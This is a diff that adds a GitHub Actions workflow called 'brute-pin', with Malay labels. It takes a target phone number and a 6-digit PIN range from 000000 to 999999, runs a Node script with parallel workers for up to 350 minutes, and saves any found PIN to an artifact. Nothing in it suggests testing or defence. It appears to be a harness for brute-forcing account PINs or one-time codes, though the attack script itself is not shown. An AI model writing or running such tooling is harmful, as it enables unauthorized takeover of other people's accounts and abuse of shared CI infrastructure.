@@ -1,0 +1,47 @@
+name: brute-pin
+
+on:
+  workflow_dispatch:
+    inputs:
+      phone:
+        description: Nombor tanpa kod negara (cth 123456789)
+        required: true
+      start:
+        description: PIN mula (6 digit)
+        required: true
+        default: "000000"
+      end:
+        description: PIN akhir (6 digit)
+        required: true
+        default: "999999"
+      concurrency:
+        description: Bilangan worker
+        required: true
+        default: "2"
+
+jobs:
+  brute:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - name: Jalankan
+        run: |
+          node src/index.js \
+            --phone "${{ inputs.phone }}" \
+            --start "${{ inputs.start }}" \
+            --end "${{ inputs.end }}" \
+            --concurrency "${{ inputs.concurrency }}" \
+            --delay 200
+        continue-on-error: true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: hasil
+          path: |
+            found.json
+            progress.json
+          if-no-files-found: ignore
